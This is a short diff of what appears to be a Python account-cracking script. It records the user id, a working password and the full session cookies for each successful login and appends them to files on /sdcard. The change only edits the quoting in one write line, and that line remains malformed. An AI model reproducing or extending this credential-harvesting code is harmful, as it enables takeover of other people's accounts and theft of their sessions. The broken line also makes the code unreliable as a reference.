@@ -265,7 +265,7 @@ class create:
                                     coki = (";").join([ "%s=%s" % (key, value) for key, value in self.ses.cookies.get_dict().items() ])
                                     cok = self.ses.cookies.get_dict()
                                     print ('\r\033[1;32m[HONEY-OK] '+cok['c_user']+' | '+passw+' | '+coki+'\033[0;97m     ')
-                                    open('/sdcard/HONEY-COOKIE.txt','a').write('+cok['c_user]+'|'+passw+'|'+coki+'\n')
+                                    open('/sdcard/HONEY-COOKIE.txt','a').write('+cok['c_user']+'|'+passw+'|'+coki+'\n')
                                     open('/sdcard/HONEY-OK.txt','a').write(ids+'|'+passw+'\n')
                                     ok.append(email+passw)
             except requests.exceptions.ConnectionError:
